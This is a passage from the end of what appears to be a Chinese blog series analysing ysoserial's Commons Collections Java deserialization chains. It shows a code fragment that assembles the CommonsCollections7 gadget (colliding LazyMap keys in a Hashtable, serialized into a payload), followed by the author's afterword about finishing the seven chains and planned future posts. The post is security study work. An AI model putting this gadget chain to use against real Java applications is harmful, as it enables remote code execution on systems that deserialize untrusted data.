Map lazyMap1 = LazyMap.decorate(new HashMap(), chainedTransformer);
lazyMap1.put("yy", 1);
Map lazyMap2 = LazyMap.decorate(new HashMap(), chainedTransformer);
lazyMap2.put("zz", 1);
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 1);
lazyMap2.clear();
lazyMap2.put("zZ", 1);
byte[] out = serialize(hashtable);
```



## 0x08 后记

到这里，ysoserial 中 7 个利用 `commons-collections` 的反序列化链已经全部分析完了（菜🐔刚开始学 Java，轻喷

有很多地方自己也不是特别理解，写的不是很到位，后续可能会有修改和补充（咕

接下来看看 ysoserial 中其它反序列化链，对一些常用的链再进行分析，再然后就开始分析一些常见框架什么的了

好耶，又可以咕了，不知道下一篇是不是又是一个月后，希望毕业前能写完这个系列🙏


